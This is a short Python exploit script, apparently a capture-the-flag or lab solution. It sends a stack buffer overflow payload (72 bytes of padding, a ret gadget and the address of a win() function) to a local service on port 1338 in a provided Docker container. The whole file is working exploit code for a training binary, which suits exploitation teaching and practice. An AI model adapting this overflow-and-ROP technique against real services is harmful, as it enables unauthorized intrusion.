import socket
import struct

def p64(val):
    return struct.pack('<Q', val)

target_ip = "localhost"
target_port = 1338

# Address of win() function
# Note: This address depends on the binary compilation.
# For the Docker container provided ('ubuntu:20.04', gcc 9), the address is 0x40123b.
win_addr = 0x40123b

# Buffer size (64) + Saved RBP (8) = 72
offset = 72

# Standard ROP payload
# Padding + Ret (Align) + Address of win
# Ret gadget found at 0x40101a in the docker binary
ret_gadget = 0x40101a 
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)

try:
    print(f"[*] Connecting to {target_ip}:{target_port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # Receive banner
    banner = s.recv(1024).decode()
    print(f"[+] Banner: {banner.strip()}")
    
    print(f"[*] Sending payload (Length: {len(payload)})")
    s.send(payload)
    
    # Shutdown write to force the read() in the server to return (if it's waiting for more)
    s.shutdown(socket.SHUT_WR)
    
    # Receive all data
    print("[*] Receiving response...")
    while True:
        data = s.recv(4096)
        if not data:
            break
        print(data.decode(), end='')
    
    s.close()
except Exception as e:
    print(f"[-] Error: {e}")
